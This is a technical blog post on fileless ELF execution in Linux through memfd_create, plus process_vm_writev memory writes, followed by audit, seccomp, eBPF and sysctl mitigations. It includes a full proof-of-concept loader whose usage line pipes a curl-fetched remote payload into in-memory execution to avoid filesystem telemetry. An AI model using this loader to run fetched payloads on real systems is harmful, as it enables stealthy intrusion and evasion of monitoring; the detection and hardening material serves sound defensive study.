# In-memory Execution and the Limits of Filesystem Telemetry

**Author:** Betha Morrison  
**Date:** June 2026  
**Tags:** linux, exploitation, evasion, memfd, process-injection

---

`memfd_create(2)` creates an anonymous tmpfs-backed inode in `shmem_mnt` - an
internal kernel mount with no user-accessible path - and returns a file
descriptor. Available since Linux 3.17. The fd behaves like a regular writable
file but has no directory entry in any filesystem namespace.

`inotify` and `fanotify` operate on dentries. An inode with no dentry cannot
be watched by either interface, so executing an ELF binary staged through
`memfd_create` produces no filesystem event. The audit subsystem is separate -
`execve`/`execveat` gets logged regardless, with the executable path recorded
as `memfd:[label]` or `memfd: (deleted)`.

---

## memfd_create and Anonymous Execution

```c
int fd = memfd_create("", MFD_CLOEXEC | MFD_EXEC);
```

The name argument appears in `/proc/pid/fd/[n]` as `memfd:[name]` but creates
no directory entry. An empty string is valid.

`MFD_EXEC` was added in kernel 6.3 alongside the `vm.memfd_noexec` sysctl.
Without it, kernel 6.3+ emits a dmesg warning when `vm.memfd_noexec >= 1`,
and fails with `EACCES` when `vm.memfd_noexec == 2`. On kernels below 6.3,
passing `MFD_EXEC` returns `EINVAL` since unknown flags are rejected. The
correct fallback pattern:

```c
fd = memfd_create("", MFD_CLOEXEC | MFD_EXEC);
if (fd < 0 && errno == EINVAL)
    fd = memfd_create("", MFD_CLOEXEC);   /* pre-6.3 kernel */
```

Stage the binary into the fd:

```c
ftruncate(fd, image_len);
write(fd, image_buf, image_len);
```

Two execution paths from here.

**Via `/proc/self/fd/`** - works on any kernel with `/proc` mounted:

```c
char path[32];
snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
execve(path, argv, envp);
```

**Via `execveat(2)` with `AT_EMPTY_PATH`** - Linux 3.19+, no `/proc` dependency.
glibc `fexecve(3)` uses this internally since glibc 2.27; older versions fell
back to the `/proc/self/fd/` path:

```c
#ifndef AT_EMPTY_PATH
# define AT_EMPTY_PATH 0x1000
#endif
syscall(__NR_execveat, fd, "", argv, envp, AT_EMPTY_PATH);
```

After exec, `/proc/[pid]/exe` resolves to `memfd: (deleted)`. The process is
running; the `(deleted)` indicates no directory entry, not termination.

---

## Proof of Concept

Reads an ELF binary from path or stdin, stages it via `memfd_create`, and
executes it. The source is never written to any named path.

```c
/*
 * memfd_exec.c
 *
 * build:  gcc -O2 -o memfd_exec memfd_exec.c
 * usage:  ./memfd_exec /bin/ls -la
 *         curl -s http://host/payload | ./memfd_exec -
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/syscall.h>

#ifndef __NR_memfd_create
# if   defined(__x86_64__)
#  define __NR_memfd_create  319
# elif defined(__aarch64__)
#  define __NR_memfd_create  279
# elif defined(__arm__)
#  define __NR_memfd_create  385
# else
#  error "unknown arch"
# endif
#endif

#ifndef __NR_execveat
# if   defined(__x86_64__)
#  define __NR_execveat      322
# elif defined(__aarch64__)
#  define __NR_execveat      281
# endif
#endif

#ifndef MFD_CLOEXEC
# define MFD_CLOEXEC      0x0001u
#endif
#ifndef MFD_EXEC
# define MFD_EXEC         0x0010u  /* kernel 6.3+ */
#endif
#ifndef AT_EMPTY_PATH
# define AT_EMPTY_PATH    0x1000
#endif

static int sys_memfd_create(const char *name, unsigned int flags)
{
    return (int)syscall(__NR_memfd_create, name, flags);
}

static unsigned char *slurp(int fd, size_t *len)
{
    unsigned char *buf = NULL;
    size_t total = 0, cap = 0;
    unsigned char tmp[65536];
    ssize_t r;

    while ((r = read(fd, tmp, sizeof(tmp))) > 0) {
        size_t n = (size_t)r;
        if (total + n > cap) {
            cap = cap ? cap * 2 : 131072;
            if (cap < total + n) cap = total + n;
            unsigned char *p = realloc(buf, cap);
            if (!p) { free(buf); return NULL; }
            buf = p;
        }
        memcpy(buf + total, tmp, n);
        total += n;
    }
    *len = total;
    return buf;
}

int main(int argc, char *argv[], char *envp[])
{
    int src, mem_fd;
    unsigned char *image;
    size_t image_len;
    char fdpath[32];

    if (argc < 2) {
        fprintf(stderr, "usage: %s <path|->\n", argv[0]);
        return 1;
    }

    src = strcmp(argv[1], "-") ? open(argv[1], O_RDONLY) : STDIN_FILENO;
    if (src < 0) { perror("open"); return 1; }

    image = slurp(src, &image_len);
    if (src != STDIN_FILENO) close(src);
    if (!image || image_len < 4) { fprintf(stderr, "read failed\n"); return 1; }

    if (memcmp(image, "\x7f""ELF", 4)) {
        fprintf(stderr, "not ELF\n");
        free(image);
        return 1;
    }

    /* MFD_EXEC: suppress dmesg warning on kernel 6.3+ (vm.memfd_noexec >= 1).
     * Falls back to flags without MFD_EXEC on pre-6.3 kernels (EINVAL). */
    mem_fd = sys_memfd_create("", MFD_CLOEXEC | MFD_EXEC);
    if (mem_fd < 0 && errno == EINVAL)
        mem_fd = sys_memfd_create("", MFD_CLOEXEC);
    if (mem_fd < 0) { perror("memfd_create"); free(image); return 1; }

    if (ftruncate(mem_fd, (off_t)image_len) < 0 ||
        write(mem_fd, image, image_len) != (ssize_t)image_len) {
        perror("stage"); close(mem_fd); free(image); return 1;
    }
    free(image);

    /* execveat: no /proc dependency, preferred on kernel 3.19+ */
#ifdef __NR_execveat
    if (syscall(__NR_execveat, mem_fd, "", argv + 1, envp, AT_EMPTY_PATH) == -1
        && errno != ENOSYS) {
        perror("execveat"); close(mem_fd); return 1;
    }
#endif
    /* fallback: /proc/self/fd/[n] */
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", mem_fd);
    execve(fdpath, argv + 1, envp);

    perror("execve");
    close(mem_fd);
    return 1;
}
```

Run while `./memfd_exec /bin/sleep 60` is active:

```
$ readlink /proc/$(pgrep sleep)/exe
/memfd: (deleted)

$ head -3 /proc/$(pgrep sleep)/maps
... r--p ... [tmpfs minor] /memfd: (deleted)
... r-xp ... [tmpfs minor] /memfd: (deleted)
... rw-p ... /memfd: (deleted)
```

The tmpfs device number in maps is system-dependent.

---

## process_vm_writev

`process_vm_writev(2)` (Linux 3.2) writes into a foreign process address space
without `PTRACE_ATTACH`. Permission is checked via `ptrace_may_access()` under
Yama's `ptrace_scope`. At `ptrace_scope=1` a parent can write to its own
children; at `ptrace_scope=0`, any same-uid pair works.

Per-distro defaults as of 2026:

| distro | `ptrace_scope` default |
|---|---|
| Ubuntu 22.04 / 24.04 / 26.04 | `1` |
| Debian 12 | `0` |
| Fedora 40/41 | `0` (change proposal to `1` pending) |
| RHEL 9 / Rocky 9 | `0` |
| Arch Linux | `1` |

```c
/*
 * vm_write_demo.c
 * parent writes into child address space via process_vm_writev
 *
 * build: gcc -O0 -o vm_write_demo vm_write_demo.c
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/wait.h>

static volatile int target = 0xdeadbeef;

static int child_fn(void)
{
    printf("[child  %d] target before: 0x%08x\n", getpid(), target);
    sleep(1);
    printf("[child  %d] target after:  0x%08x\n", getpid(), target);
    return 0;
}

int main(void)
{
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return 1; }
    if (pid == 0) return child_fn();

    usleep(200000);

    int val = 0x41414141;
    struct iovec local  = { &val,            sizeof(val) };
    struct iovec remote = { (void *)&target, sizeof(val) };

    ssize_t r = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    printf("[parent %d] process_vm_writev -> %zd bytes @ child:%p\n",
           getpid(), r, (void *)&target);

    wait(NULL);
    return 0;
}
```

```
[child  7823] target before: 0xdeadbeef
[parent 7822] process_vm_writev -> 4 bytes @ child:0x601040
[child  7823] target after:  0x41414141
```

The global `target` is at the same virtual address in parent and child after
`fork(2)` - COW preserves the VA layout. The parent uses that address directly
as the remote `iov_base`.

---

## Mitigations

**`vm.memfd_noexec` sysctl (kernel 6.3+).** Per-pid-namespace control for
executable memfd:

| value | behavior |
|---|---|
| `0` | default; executable memfd unrestricted |
| `1` | `memfd_create()` without `MFD_NOEXEC_SEAL` emits dmesg warning; exec still works |
| `2` | `memfd_create()` without `MFD_NOEXEC_SEAL` fails with `EACCES` |

At level 2, passing `MFD_EXEC` explicitly also fails - it creates an executable
memfd without `MFD_NOEXEC_SEAL`, which is what level 2 rejects. All mainstream
distros ship at level 0 in 2026. Can be set per container via pid namespace.

**seccomp-bpf** blocking `__NR_memfd_create` (319/x86-64, 279/aarch64, 385/arm)
prevents anonymous inode creation at the syscall boundary. Requires an explicit
custom policy - not a default on standard Linux installs.

**eBPF kprobe/tracepoint on `do_execveat_common`** fires on every execution
including from anonymous fds. At that hook point the probe has access to the
`linux_binprm` struct and can inspect whether the backing inode has a real
dentry. Requires the detection rule to be written specifically against
anonymous-inode execution.

**audit(8)** logs `execve`/`execveat` with the path `memfd: (deleted)`. A rule
matching that pattern is one line and low-noise. Not present in default
configurations anywhere.

**`ptrace_scope=3`** disables `process_vm_writev` entirely, along with all
ptrace-based operations.

---

*Behavior may vary across kernel versions and distributions.*  
*- Betha Morrison*
